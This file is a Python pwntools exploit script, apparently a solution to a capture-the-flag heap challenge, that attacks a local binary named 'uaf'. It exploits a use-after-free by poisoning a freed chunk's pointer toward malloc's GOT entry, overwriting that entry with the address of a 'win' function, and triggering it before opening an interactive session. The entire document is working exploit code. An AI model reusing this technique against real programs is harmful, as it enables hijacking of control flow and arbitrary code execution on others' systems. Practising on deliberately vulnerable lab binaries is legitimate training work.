from pwn import *
#context.log_level='DEBUG'

p = process("./uaf")
elf = ELF("./uaf", checksec=False)
libc = elf.libc

def malloc(size):
	p.sendline("1")
	p.sendlineafter("size: ", f"{size}")
	p.recvuntil("> ")

def free(idx):
	p.sendline("2")
	p.sendlineafter("index: ", f"{idx}")
	p.recvuntil("> ")

def edit(idx, content):
	p.sendline("4")
	p.sendlineafter("index: ", f"{idx}")
	p.sendlineafter("data: ", content)
	p.recvuntil("> ")

def quit():
	p.sendline("7")

if __name__=="__main__":

	pause()
	malloc(0x18) # 0
	free(0)
	edit(0, p64(elf.got['malloc']))

	malloc(0x18) # 1
	malloc(0x18) # 2
	edit(2, p64(elf.symbols['win']))
	malloc(0x18) # trigger

	p.interactive()
